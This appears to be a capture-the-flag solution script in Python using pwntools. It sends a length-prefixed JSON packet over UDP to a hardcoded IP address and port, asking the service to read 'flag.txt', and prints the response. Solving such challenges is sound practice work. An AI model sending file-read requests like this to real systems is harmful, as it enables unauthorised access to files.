from pwn import *
import json

packet = b'{"action":"read", "file": "flag.txt"}'
data = p16(len(packet))+packet

io = remote('167.71.204.85', 3108, typ='udp')

io.send(data)
print(io.recv())
